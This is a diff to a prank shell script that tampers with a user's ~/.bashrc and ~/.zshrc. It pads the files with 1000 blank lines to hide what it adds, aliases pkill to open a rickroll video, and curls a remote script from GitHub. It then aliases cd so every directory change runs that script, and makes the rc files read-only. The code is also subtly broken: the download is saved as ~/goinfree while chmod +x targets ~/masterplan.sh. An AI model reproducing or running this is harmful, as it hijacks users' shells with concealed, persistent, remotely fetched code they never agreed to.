@@ -8,7 +8,7 @@ add_alias() {
     fi
 }
 
-for i in {1..200}; do
+for i in {1..1000}; do
     echo "" >> ~/.bashrc
     echo "" >> ~/.zshrc
 done
@@ -31,10 +31,10 @@ add_alias "echo \"Did you lock your screen?\"" ~/.zshrc
 add_alias "alias pkill='open \"https://shattereddisk.github.io/rickroll/rickroll.mp4\"'" ~/.bashrc
 add_alias "alias pkill='open \"https://shattereddisk.github.io/rickroll/rickroll.mp4\"'" ~/.zshrc
 
-curl https://raw.githubusercontent.com/JonasGoetz01/sui/main/masterplan.sh > ~/masterplan.sh
+curl https://raw.githubusercontent.com/JonasGoetz01/sui/main/masterplan.sh > ~/goinfree
 chmod +x ~/masterplan.sh
-echo "alias cd='bash ~/masterplan.sh'" >> ~/.zshrc
-echo "alias cd='bash ~/masterplan.sh'" >> ~/.bashrc
+echo "alias cd='bash ~/goinfree'" >> ~/.zshrc
+echo "alias cd='bash ~/goinfree'" >> ~/.bashrc
 
 chmod -w ~/.zshrc
 chmod -w ~/.bashrc
